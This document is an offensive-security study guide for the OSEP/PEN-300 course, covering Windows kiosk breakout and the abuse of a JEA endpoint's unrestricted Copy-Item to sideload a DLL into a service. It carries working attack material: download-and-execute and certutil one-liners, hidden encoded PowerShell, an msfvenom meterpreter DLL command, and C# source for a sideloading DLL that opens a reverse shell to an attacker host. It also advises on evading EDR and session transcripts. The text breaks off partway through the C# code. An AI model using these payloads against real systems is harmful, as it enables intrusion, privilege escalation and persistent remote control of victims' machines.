::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Kiosk breakout, JEA, and JIT

Three restricted-admin paths from PEN-300 Chapters 16 and 23. If you have a locked single-app desktop, break out of the kiosk. If you have a constrained remoting endpoint, abuse an over-broad `Copy-Item`. If privileges are granted only for a short window, purge tickets and use the window — don't improvise inside it.

You already hold domain credentials (`DOMAIN\USER` plus `PASS` or `NTHASH`) and can reach `TARGET`. Kiosk is usually an RDP or physical session; JEA needs WinRM (5985/5986); JIT needs LDAP (389) or WinRM.

## Kiosk breakout

If the Windows shell is replaced or Assigned Access locks the machine to one app, don't stop at a blocked Start menu or Win+R. Work file dialogs, help, and print first — they are the channels most often left open. The breakout usually lands as the kiosk user (standard rights); escalation then follows the normal process (modules 06 / 07).

If the kiosk is Linux (Porteus-style), this Windows dialog path does not apply — use the browser address bar and file dialogs in PEN-300 §16.1–16.4.

If Alt+F4 (or closing the kiosk app) drops you on the desktop, you already have the desktop — probe the shell state before drilling holes.

- [ ] Start a listener and have stage-2 ready (`nc -lvnp LPORT`, plus a PowerShell one-liner or EXE at `URL`)
- [ ] Confirm the shape of the restriction (Win key, Alt+Tab, Task Manager, file dialogs, writable paths)
- [ ] Work channels in order of increasing cost, quiet before loud — tick `m14-kiosk-breakout.md` once per item
- [ ] As soon as you have execution, fire a single pre-assembled command and confirm identity
- [ ] Record which channels worked and which were blocked (the report needs this)

Start the listener:

```bash
nc -lvnp LPORT
```

If you are going in over RDP, confirm whether clipboard and local drive mapping work — if they do, delivery is easier.

Check the restriction first:

```text
Win key / Ctrl+Esc / Alt+F4 / Alt+Tab / Ctrl+Shift+Esc
In-app Open / Save As / Import / Export / Attach file / Print
```

Then work these channels. Try each once.

**File dialog** (most common, most often unblocked). Any Open / Save As / Import / Export / Attach file button:

```text
1) Open the dialog
2) Type  C:\Windows\System32   in the address bar and press Enter
3) Type  cmd.exe               in the address bar and press Enter
   (if the name is not recognized, type C:\Windows\System32\cmd.exe)
4) Or type \\LHOST\share\PAYLOAD in the file name box when the share is reachable
```

If `C:\Windows\System32` is blocked, try `\\127.0.0.1\C$\Windows\System32\` or an environment variable (`%COMSPEC%` is `cmd.exe`; also `%TEMP%`, `%APPDATA%`, `%WINDIR%`, `%USERPROFILE%`). In the address bar, `shell:System`, `shell:Downloads`, `shell:MyComputerFolder`, and `shell:Common Start Menu` jump to those folders.

**Browser `file://`**. If the kiosk app is a browser, type `file:///C:/Windows/System32/cmd.exe` in the address bar. IE / the WebBrowser control may offer Run; Chrome / Edge usually only download — then use the file dialog to reach the download directory and execute from there.

**Print / export**. Ctrl+P → Save as PDF / Print to PDF / Export. The Save As dialog is a standard file dialog — reuse the steps above. Print preview often has Open / Save / Find as well.

**Help**. If Help opens a `.chm` (`hh.exe`), jump-URL or shortcut entries can point at a program; right-click → View source / Print also brings up a file dialog. Search the help dialog for Notepad, `cmd.exe`, or PowerShell — entries often contain clickable shortcuts. If Help opens in the browser, go back to `file://`.

**Installed apps** on the allow-list (Notepad, WordPad, Paint, a PDF reader): File → Open / Save As is the same dialog. A browser “Show in folder” on a download opens Explorer — type `cmd.exe` in that address bar.

**Right-click, shortcuts, and drag**. In a file dialog, Create shortcut, then change the target to `cmd.exe` or `powershell.exe`. Add to Favorites / Send to if it appears. If right-click is disabled but you can browse, drag any file onto `cmd.exe` or `powershell.exe` to open a command window.

**Task Manager and accessibility**. Ctrl+Shift+Esc → File → Run new task → `cmd`. Ctrl+Alt+Del or Win+L may expose a lock-screen Task Manager. Win+U opens Ease of Access; the on-screen keyboard often still has a virtual Win key (try Win+R / Win+E). F1, Ctrl+P, Alt+Tab, Win+R, and Ctrl+Esc are worth one try each.

**Error dialogs**. Deliberately break the kiosk app (malformed input, oversized file, offline operation). “View log / Details / Open location / Export diagnostics” usually land in a file dialog or Explorer.

If a blacklist blocks `powershell.exe` by name or path, copy it, rename it, and run the copy. If you have write access to a whitelisted path, replace that file instead (hash/name/path blacklists break when any one of those changes).

As soon as you have execution, fire one pre-assembled command so a flashing window still completes:

```bat
:: ① One command, fully formed
cmd /c powershell -nop -w hidden -enc <Base64 of PAYLOAD>

:: ② Download and execute in memory (nothing touches disk)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL/s.ps1')"

:: ③ When you must touch disk, use a built-in downloader and prefer %TEMP%
certutil -urlcache -split -f URL/PAYLOAD %TEMP%\PAYLOAD && %TEMP%\PAYLOAD

:: ④ Confirm identity and network (decides escalation vs direct lateral movement)
whoami & hostname & ipconfig & netstat -ano & cmdkey /list
whoami /groups | findstr /i "Mandatory"
dir %APPDATA%\Microsoft\Credentials
```

A callback, or visible command output, is success. `whoami` should be the kiosk user. Medium integrity means you still need elevation; High means you are already elevated.

If every Open/Save As dialog is blocked by policy, try print, an error dialog, or the on-screen-keyboard Win key. If the browser only downloads, use the file dialog to reach the download directory, or deliver a `.hta` / `.lnk` / `.chm` and hunt for a dialog from inside that handler. If all user-level channels are blocked, fall back to system-level entries (boot/firmware with physical access is usually outside exam scope); an RDP kiosk can be disconnected and reconnected to watch the pre-login interface (sethc/utilman need a writable system disk — see module 06). If the kiosk reverts on every reboot, give up on persistence and finish inside the current session.

Try each channel once — repeated probing lights up the shell/EDR. Prefer dialogs (no new process) and memory-only payloads after the breakout; do not drop an exe in a kiosk-writable directory. Kiosks often have screen recording, so paste a pre-written command and go. Keep the tick list: the report must state which channels worked, which were blocked, and how to reproduce them.

::: details `m14-kiosk-breakout.md` · click to expand

````markdown
# Kiosk breakout path checklist (Scenario 41)

> Purpose: a tick-box checklist of the channels that can give you command execution on a restricted kiosk desktop (single app / Assigned Access / replaced shell),
>
> and of how to turn an execution opportunity into a stable payload.
>
> Scenario: 41 (restricted kiosk desktop only, no terminal)
>
> Dependencies: physical terminal or RDP interaction; a listener already running on the attacker side (`nc -lvnp LPORT`) plus a stage-2 `PAYLOAD` and a delivery `URL`
>
> Use: work through it on site in order of increasing cost, quiet before loud, and **try each item once**; record the result in the §5 checklist (the report must state which channels worked and which were blocked)
>
> Placeholders: `LHOST` (attacker IP), `LPORT` (listener port), `TARGET` (target host), `USER` (kiosk account), `URL` (delivery address), `PAYLOAD` (payload file name)
>
> Test status: operational notes, no executable code; every command must be checked against the actual version in the lab (especially the browser engine and the Edge/Chrome policies)

---

## 1. Confirm the shape of the restriction first (do not rush to drill holes)

| What to confirm | How to confirm | How to use the answer |
|---|---|---|
| Single-app kiosk or restricted shell | Win key / Ctrl+Esc / Ctrl+Alt+Del / Alt+F4 | Alt+F4 closes the kiosk app and lands on the desktop = you already have the desktop, no breakout needed |
| Any other windows | Alt+Tab, taskbar | Leftover Explorer/dialog = look there first for "Open/Save As" |
| Is Task Manager available | Ctrl+Shift+Esc | Available → use §2.7 (File → Run new task) |
| Are there file dialogs | In-app "Open/Save As/Import/Export/Attach file/Print" buttons | Present → §2.2, the most common and most often unblocked channel |
| Is there a writable location | User profile, `%TEMP%`, browser download directory | Decides whether you can touch disk; if not, go memory-only |

---

## 2. Channel checklist

### 2.1 Browser address bar `file://` (try first when the kiosk app is a browser)

| Engine | Action | Success signal | Blocked signature |
|---|---|---|---|
| IE / WebBrowser control (same engine) | Type `file:///C:/Windows/System32/cmd.exe` in the address bar → an "Open/Save" prompt appears → choose **Run** | A cmd window opens directly | The prompt bar is disabled by policy / only Save is offered |
| Chrome / Edge (modern engine) | Same as above | **Only triggers a download, never executes** (default behavior) | Download completes → go to §2.2, use the file dialog to reach the download directory and execute from there |
| Any engine | Browse `file:///C:/Windows/System32/` | Directory listing works = you have at least file-system browse rights | "Cannot access" = file URLs are blocked |

> Alternate entry points: links on `about:` pages, developer tools (F12, if not disabled), the "Print" entry (see §2.4).

### 2.2 Generic file dialogs (Open / Save As / Import / Export / Attach file)

**The most common channel, and the one most often left unblocked.** The modern Open/Save dialog has its own address bar and file name box:

```text
1) Click any "Open/Save As/Import/Export/Attach file" button
2) Type  C:\Windows\System32   in the address bar and press Enter   → you land in that directory
3) Type  cmd.exe               in the address bar and press Enter   → Explorer-family dialogs execute program names found on PATH
   (if the name is not recognized, type the full path C:\Windows\System32\cmd.exe)
4) Or type \\LHOST\share\PAYLOAD in the file name box to execute a file straight off SMB (when egress/the share is reachable)
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| The address bar is editable and navigation works | Address bar read-only / directory tree only | The directory tree also reaches System32, then type `cmd.exe` in the file name box |
| Pressing Enter opens a cmd window | Double-clicking files is stopped by an "Open with" policy | Try `.bat`/`.cmd`/`.exe` each once; `.lnk` works too |

### 2.3 Help → View (Help menu / hh.exe / .chm)

```text
1) App "Help" menu → if it opens as a .chm (an hh.exe window):
   - The "jump to URL / shortcut" entries inside the CHM can point at an external program
   - In the hh.exe window, right-click → View source / Print → this brings up a file dialog (back to §2.2)
2) If Help opens in the browser → back to §2.1/§2.2
3) The Help window's "Options → View / Open" buttons also land in a file dialog
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| A .chm window opens and right-click works | Help menu grayed out / error on open | The error dialog itself is also a channel (see §2.8) |

### 2.4 Print/export dialogs (print to PDF / save as PDF / export report)

```text
1) Any "Print" entry (Ctrl+P) → choose "Save as PDF"/"Print to PDF"/"Export"
2) The "Save as" dialog that appears = a standard file dialog → reuse §2.2 exactly
3) The print preview window usually has "Open/Save/Find" buttons that also carry a dialog
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| A "Save as PDF" file dialog appears | No print permission / printer driver removed | Try other export entries such as "Export to XPS/CSV/Image" |

### 2.5 Installed applications (programs on the allow-list)

| Application | Breakout point | Action that reaches execution |
|---|---|---|
| Notepad | File → **Open** / **Save As** → path bar | Type `C:\Windows\System32` in the path bar, type `cmd.exe` in the file name box and press Enter |
| Notepad | Help → About/Feedback link (some versions carry an http link) | The link opens in the browser → back to §2.1 |
| WordPad | File → Open → "Insert object"/file dialog | Same as §2.2; the inserted object can point at an executable |
| mspaint (Paint) | File → Open / Save As | Same as §2.2 |
| calc (Calculator) | Help → About → link (old versions) / navigation menu | On old versions the http link in "About" can launch the browser; newer versions are basically a dead end, so use another app |
| PDF reader | Open file / Save a copy / Print / Attachments | Every one of these carries a file dialog |
| Browser | Download directory + file dialog; "Show in folder" on a download | That opens an Explorer window → type `cmd.exe` in the address bar |
| Files associated with an Office viewer | Open → macro/object (most kiosks have macros disabled) | If macros are disabled, just use its file dialog |
| cmd / PowerShell allowed | You already have a terminal, no breakout needed | Go straight to §3 |

### 2.6 Accessibility / input method

| Action | Success signal | Notes |
|---|---|---|
| Win+U (Ease of Access Center) | A panel opens with Narrator / on-screen keyboard links | The Narrator window sometimes carries an "Open" entry |
| On-screen keyboard (osk) | The keyboard has a virtual Win key | Try Win+R / Win+E; many kiosks only lock the shell, not this |
| Touch keyboard / IME bar | Can open the input-method settings window | The settings window usually carries "Open location/Browse" buttons |

### 2.7 Task Manager

```text
Ctrl+Shift+Esc → File → Run new task → type cmd (or powershell)
```

| Success signal | Blocked signature | Notes |
|---|---|---|
| "Run new task" works and starts cmd as the current user | UAC appears, meaning it is requesting elevation → switch to a user-level channel | Only consider the UAC route when every user-level channel is blocked (see M06) |

### 2.8 Error dialogs (triggered on purpose)

Deliberately make the kiosk app fail (malformed input, an oversized file, an operation while offline). The error box usually carries "View log / Details / Open location / Export diagnostics",
and those buttons all end up in a file dialog or an Explorer window.

---

## 3. After you get an execution opportunity: turn it into a stable shell

**Principle: quiet (memory) before disk; pre-assemble the commands so they still complete when the window flashes past.**

```bat
:: ① One command, fully formed (it does not matter if cmd flashes past - less dwell time)
cmd /c powershell -nop -w hidden -enc <Base64 of PAYLOAD>

:: ② Download and execute in memory (nothing touches disk; no exe in a kiosk-writable directory)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL/s.ps1')"

:: ③ When you must touch disk, use the built-in downloader and prefer %TEMP%
certutil -urlcache -split -f URL/PAYLOAD %TEMP%\PAYLOAD && %TEMP%\PAYLOAD

:: ④ Immediately after the callback, confirm identity and network (it decides whether the next step is escalation or direct lateral movement)
whoami & hostname & ipconfig & netstat -ano & cmdkey /list
whoami /groups | findstr /i "Mandatory"      :: check the integrity level: Medium = needs elevation, High = already elevated
dir %APPDATA%\Microsoft\Credentials
```

> Fill in `LHOST`/`LPORT` when you generate `PAYLOAD`; keep `nc -lvnp LPORT` running on the attacker machine.
>
> On a kiosk that reverts on every reboot: do not rely on persistence, finish everything inside the current session.

---

## 4. Failure branches

1. **Open/Save As dialogs are all blocked by policy** → the print dialog (§2.4), error dialogs (§2.8), the Win key on the on-screen keyboard (§2.6).
2. **The browser only downloads, never executes** → after downloading, use §2.2 to reach the download directory and execute there; or deliver a file that a system handler opens (`.hta`/`.lnk`/`.chm`),
   and then hunt for a dialog/jump channel from inside that handler.
3. **All user-level channels are blocked** → system-level entries (boot order/firmware when you have physical access, beyond the usual exam scope);
   an RDP kiosk can be disconnected and reconnected to observe the pre-login interface (accessibility entries belong to the pre-login scenario and need a writable system disk, see M06).
4. **Writing to the Startup directory is denied by ACL** → switch to `%TEMP%`/the user profile; if you can create a scheduled task, trigger through that instead.
5. **The kiosk reverts on every reboot** → give up on persistence and finish every action inside the current session.

---

## 5. On-site tick list

```text
[ ] Alt+F4 / closing the app drops you to the desktop        [ ] Win key / Ctrl+Esc opens the Start menu
[ ] Ctrl+Shift+Esc Task Manager            [ ] File → Run new task → cmd
[ ] Browser address bar file:///C:/Windows/System32/cmd.exe    [ ] Open dialog address bar → cmd.exe
[ ] Save As dialog → cmd.exe               [ ] Print/Export PDF → Save As dialog
[ ] Help → View / hh.exe / .chm          [ ] Installed apps: Notepad / WordPad / mspaint / calc / PDF
[ ] Win+U Ease of Access / on-screen keyboard Win key      [ ] Deliberately trigger an error → View log/Open location
[ ] Execution opportunity solidified (callback succeeded / command output visible)
[ ] Recorded: working channels, blocked channels, reproduction steps (goes in the report)
```

---

## 6. Exam / OPSEC notes

- **Try each channel once**: repeated probing leaves a lot of suspicious interaction in the shell/EDR; prefer the dialog-type channels with no process behavior.
- Avoid touching disk before the callback; after the breakout prefer memory-only channels (PowerShell reflection / `Add-Type` in-memory loading).
- Kiosks often have screen recording/monitoring, so work fast and pre-write the commands to paste and run in one go.
- Keep the tick list: the report must state which channels worked, which were blocked, and how to reproduce them.
````

:::

## JEA over-permissive file copy

If the endpoint only exposes a few commands and one of them is `Copy-Item` with an unrestricted `-Destination`, don't look for a shell inside the session. Stage a missing-dependency DLL where a service will load it, then wait for (or trigger) that load so the code runs as the service account.

JEA is a PowerShell session configuration (`-ConfigurationName`). Default `RestrictedRemoteServer` sessions run in **NoLanguageMode** and do not include `Copy-Item` — if you see it, it was added in the role capability. `whoami.exe` and `.NET` syntax will fail; `Get-Command` is the allow-list — what you can see is what you can use. Virtual accounts, when enabled, belong to the local Administrators group by default.

- [ ] Discover the endpoint name (PowerShell history is the usual source; `Get-PSSessionConfiguration` if you can)
- [ ] Compile the DLL with a name and architecture that match the missing dependency (`m14-jea-service-dll.cs`, or an msfvenom DLL as in the course)
- [ ] Start a listener; confirm WinRM to `TARGET`
- [ ] Connect to the JEA endpoint and run `Get-Command`
- [ ] Probe the write boundary with a harmless file, then `Copy-Item` the DLL into the service directory
- [ ] Trigger the load (`Restart-Service` if allowed; otherwise wait for a service or host restart)

Discovery often comes from another host you already own:

```powershell
(Get-PSReadlineOption).HistorySavePath
# default: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-PSSessionConfiguration | Select-Object Name, Permission   # if you can enumerate it
```

Connect and enumerate:

```powershell
$cred = Get-Credential DOMAIN\USER
Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA-endpoint> -Credential $cred
Get-Command | Select-Object Name, Source
```

With only an NTHASH and no cleartext, native WinRM cannot use the hash — switch to the evil-winrm / hash templates in module 15, or exchange the hash for a ticket first.

Confirm `Copy-Item` is listed; whether `Restart-Service` / `Test-Path` appear decides your trigger and validation. A language-mode error (`The syntax is not supported by this runspace` / `ScriptsNotAllowed`) means NoLanguageMode — stay on allow-listed cmdlets only.

Probe the boundary, then drop the DLL. Stage the file on a share or home folder the session can read, then `Copy-Item` it — do not rely on `Set-Content` or `WriteAllBytes` inside the JEA session:

```powershell
# harmless probe (course used Copy-Item, not Set-Content)
Copy-Item C:\shares\home\USER\probe.txt -Destination "<service-dir>\m14probe.txt"

# drop the payload — file name must be the missing dependency, architecture must match the host
# course example: FileZilla Server loading msasn1.dll from its install dir
Copy-Item C:\shares\home\USER\msasn1.dll -Destination "C:\Program Files\FileZilla Server\msasn1.dll"
```

Keep a backup of any overwritten DLL on the attacker box so you can restore it. Identify the missing name with dumpbin / ProcMon against a replica (filter on the service exe, start the service, look for NAME NOT FOUND in the application directory). Common sideloadable names include `version.dll`, `winmm.dll`, `winhttp.dll`, `dbghelp.dll`, `profapi.dll`. DLL search order starts in the application directory, then the system directories, then PATH.

Compile the managed template (or generate a raw DLL with msfvenom, as the course did):

```bash
# course-style raw DLL (name it after the missing dependency)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=443 -a x64 --platform windows -f dll > msasn1.dll

# or the managed template — InstallUtil route (no native export required)
csc.exe /target:library /out:m14-jea-service-dll.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
```

A 32-bit host needs the 32-bit `csc` under `C:\Windows\Microsoft.NET\Framework\v4.0.30319`. If you need the service to keep running, use a proxy DLL that forwards to the real one (module 04) — a failed load can crash the service before your payload runs.

Trigger the load:

```powershell
# if the role allows it
Restart-Service <service-name>
# or Stop-Service then Start-Service, if only one of the two is visible
```

If there is no service-control command, wait for the service or the host to restart (the course waited for a reboot) and keep the listener up. Automate the connect / enumerate / probe / drop / trigger loop with `m14-jea-file-copy.ps1`. It uses local implicit-remoting proxies, so the remote endpoint receives only allow-listed command invocations, not script variables or .NET calls. Stage the probe and DLL beforehand in a target-local path the session can read (for example, the home share via your ordinary SMB access); a local attacker path is not a remote source path.

```powershell
.\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEA-endpoint> -Domain DOMAIN -User USER `
    -Pass 'PASS' -ProbeSource 'C:\shares\home\USER\probe.txt' `
    -StagedPayload 'C:\shares\home\USER\evil.dll' -RemoteDir 'C:\Program Files\<Vendor>' `
    -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
```

A listener callback with `whoami` as the service account (often `NT AUTHORITY\SYSTEM`) is end-to-end success. If `Test-Path` is not allow-listed, a second `Copy-Item` of the same name that errors “already exists / in use” is an indirect write signal.

If `-Destination` is restricted, try to read the role capability `.psrc` (`C:\Program Files\WindowsPowerShell\Modules\<module>\<role-capability>\*.psrc`) for allowed paths, or write into a share the service treats as a module/config directory. If the service does not load the DLL, the name or architecture is wrong — confirm the import table / ProcMon NAME NOT FOUND. If there is no service trigger at all, reuse `Copy-Item` against a logon script, a scheduled-task script, or a Startup shortcut (a logon-folder drop does not guarantee a privileged context). If the service runs as NetworkService/LocalService rather than SYSTEM, accept that context or pick a different service.

JEA endpoints usually record a transcript: keep the payload inside the DLL and leave only role-appropriate operations (`Copy-Item`, maybe `Restart-Service`) in the session. Use business-like file names. Restarting a service can disrupt business — record the original state and restore it. Confirm `LHOST` inside the DLL one last time before delivery; once it is out there you cannot change it.

::: details `m14-jea-service-dll.cs` · click to expand

````csharp
// Purpose: Service DLL payload of JEA scenario - executed when loaded by high-privilege context (service account/SYSTEM/InstallUtil host),
// The action is "Write with higher permissions to a location that a low-privileged account cannot write to" (verify that the unauthorized write is successful), and you can optionally connect back to LHOST:LPORT.
// Scenario: 42 (JEA session exposes only a few commands, including over-privileged file copying)
// Depends: .NET Framework 3.5+/4.x (csc.exe comes in C:\Windows\Microsoft.NET\Framework64\v4.0.30319)
// Compile:
// # ① InstallUtil trigger route (no native export required, most stable)
//   csc.exe /target:library /out:m14-jea-service-dll.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
// # ② Native export (side loading) route: DllExport tool chain (3F/DllExport or UnmanagedExports) is required followed by -define:USE_DLLEXPORT
//   csc.exe /target:library /define:USE_DLLEXPORT /out:version.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
// # ③ 32-bit host must use 32-bit csc: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe (x64 service cannot load x86 DLL)
// Usage: 
// # InstallUtil trigger (if Restart-Service is allowed in the JEA session, the target service can also be triggered by restarting it)
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U m14-jea-service-dll.dll
// # Side-loading trigger: name the DLL after the dependency the host is missing (for example version.dll), place it in the service directory and restart the service.
//   copy m14-jea-service-dll.dll "C:\Program Files\TargetSvc\version.dll" /Y
//   sc stop TargetSvc && sc start TargetSvc
// Placeholders: LHOST=attack machine IP, LPORT=listening port (reconnection mode; automatically skip reconnection when not replaced and only do mark writing)
// Test status: Not compiled on this machine (no csc); the code is written according to .NET Framework 4.x API and needs to be compiled and verified in the experimental environment
//
// Export name and calling convention (which determines the success or failure of sideloading, be sure to check it word for word):
// 1. The file name must be exactly the same as the DLL that the host is looking for (the missing dependency seen by ldd/dumpbin/imports or ProcMon,
// Common sideloadable names: version.dll, winmm.dll, winhttp.dll, dbghelp.dll, profapi.dll).
// 2. The exported function name, number and order of parameters, and return value must be consistent with the original DLL; this file provides six exports of version.dll.
// 3. Calling convention: x86 uses StdCall ([UnmanagedFunctionPtr(CallingConvention.StdCall)]), and all conventions under x64 are equivalent.
// But the attribute is still written as StdCall for consistency; the name modification (_GetFileVersionInfoW@16) is handled by the DllExport tool,
// After generation, use dumpbin /exports version.dll to check that there are no redundant prefixes/suffixes in the export name.
// 4. Do not export DllMain: The DllMain of a managed DLL is taken over by the CLR, and manual export is prone to deadlock loader locks.
// Use module initialization when "load and execute" is required (the static constructor of this file has triggered the Payload when the export is first called).
// 5. The architecture must match the host: x64 service will directly report BadImageFormatException when loading x86 DLL.

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

#if !USE_DLLEXPORT
// When using the DllExport toolchain (-define:USE_DLLEXPORT above), this feature is provided by the tool and this section is skipped.
// When not using the tool chain (only taking the InstallUtil/hosted service route), the placeholder feature with the same name is given here to ensure that the file can be compiled directly with csc.
[AttributeUsage(AttributeTargets.Method, AllowMultiple = false)]
public sealed class DllExportAttribute : Attribute
{
    public DllExportAttribute() { }
    public DllExportAttribute(string exportName) { ExportName = exportName; }
    public string ExportName { get; set; }
    public CallingConvention CallingConvention { get; set; }
}
#endif

namespace M14Jea
{
    // Payload ontology: All trigger routes (InstallUtil/Service/Native Export) eventually call Payload.Run()
    public static class Payload
    {
        // High-privilege write target: Ordinary domain users cannot write in. If they can write successfully, it means that "writing without privileges + code running under a service account" is true.
        private const string MarkerPath = @"C:\Program Files\Common Files\m14-jea.marker";

        // Backlink target (placeholder, replaced before delivery; automatically skips backlink if not replaced)
        private const string LHOST = "LHOST";
        private const int LPORT = 4444;

        private static int _done = 0;

        public static void Run()
        {
            // Run only once: The host may call the exported function multiple times/load it multiple times
            if (Interlocked.Exchange(ref _done, 1) == 1) return;

            try { WriteMarker(); }
            catch (Exception ex) { TryLog("marker failed: " + ex.Message); }

            try { if (!LHOST.Contains("LHOST")) ReverseShell(LHOST, LPORT); }
            catch (Exception ex) { TryLog("rev failed: " + ex.Message); }
        }

        // Action ①: Write the file with higher permissions - this is the "task body" of this DLL and the best step to verify
        private static void WriteMarker()
        {
            string who;
            try { who = WindowsIdentity.GetCurrent().Name; }
            catch { who = Environment.UserName; }

            string body = "m14-jea-service-dll marker\n"
                        + "time : " + DateTime.Now.ToString("o") + "\n"
                        + "who  : " + who + "\n"
                        + "proc : " + Process.GetCurrentProcess().ProcessName + "\n"
                        + "path : " + MarkerPath + "\n";

            string dir = Path.GetDirectoryName(MarkerPath);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            {
                // Create the directory even if it does not exist: this step itself requires high permissions
                Directory.CreateDirectory(dir);
            }
            File.WriteAllText(MarkerPath, body, Encoding.UTF8);
        }

        // Action ②: optional callback (replace LHOST/LPORT with real values first; the callback is skipped automatically when they are not replaced)
        private static void ReverseShell(string host, int port)
        {
            TcpClient client = new TcpClient();
            client.Connect(host, port);
            NetworkStream ns = client.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();

            Thread t1 = new Thread(() => { try { p.StandardInput.BaseStream.CopyTo(ns); } catch { } });
            Thread t2 = new Thread(() => { try { ns.CopyTo(p.StandardInput.BaseStream); } catch { } });
            t1.IsBackground = true; t2.IsBackground = true;
            t1.Start(); t2.Start();

            p.WaitForExit();
            try { client.Close(); } catch { }
        }

        // Do not throw any exceptions: if the service fails to start, event logs will be written, which will make it more exposed.
        private static void TryLog(string msg)
        {
            try
            {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "m14-jea-err.txt"),
                                   DateTime.Now.ToString("o") + " " + msg + Environment.NewLine);
            }
            catch { }
        }
    }

    // Route ①: InstallUtil host (InstallUtil.exe /U m14-jea-service-dll.dll triggers Uninstall, Install is the same)
    [RunInstaller(true)]
    public class JeaInstaller : Installer
    {
        public override void Install(System.Collections.IDictionary stateSaver)
        {
            Payload.Run();
            base.Install(stateSaver);
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Payload.Run();
            base.Uninstall(savedState);
        }
    }

    // Route ②: Managed service (if the target service is a .NET service, you can put it into the service directory as a plug-in/dependent DLL and restart the service)
    public class JeaService : ServiceBase
    {
        public JeaService() { ServiceName = "M14JeaSvc"; }

        protected override void OnStart(string[] args)
        {
            // Must return immediately, otherwise SCM reports "Service startup timeout" (1053) - the load is placed in the background thread
            Thread t = new Thread(new ThreadStart(Payload.Run));
            t.IsBackground = true;
            t.Start();
        }

        protected override void OnStop() { }
    }

    // Route ③: Native export (side loading). Taking version.dll as an example, the export name/signature/calling convention copies the real Windows API.
    public static class Exports
    {
        private const string RealDll = @"C:\Windows\System32\version.dll";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool GetFileVersionInfoWDelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool GetFileVersionInfoADelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetFileVersionInfoSizeWDelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate int GetFileVersionInfoSizeADelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool VerQueryValueWDelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool VerQueryValueADelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        // Forwarding: Get the original function from the real version.dll of System32 to ensure that the host business is not affected (no crash)
        private static T Resolve<T>(string exportName) where T : class
        {
            IntPtr h = LoadLibrary(RealDll);
            if (h == IntPtr.Zero) return null;
            IntPtr fn = GetProcAddress(h, exportName);
            if (fn == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(fn, typeof(T)) as T;
        }

        [DllExport("GetFileVersionInfoW", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoW(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoWDelegate real = Resolve<GetFileVersionInfoWDelegate>("GetFileVersionInfoW");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoA", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoA(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoADelegate real = Resolve<GetFileVersionInfoADelegate>("GetFileVersionInfoA");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoSizeW", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeW(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeWDelegate real = Resolve<GetFileVersionInfoSizeWDelegate>("GetFileVersionInfoSizeW");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("GetFileVersionInfoSizeA", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeA(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeADelegate real = Resolve<GetFileVersionInfoSizeADelegate>("GetFileVersionInfoSizeA");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("VerQueryValueW", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueW(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
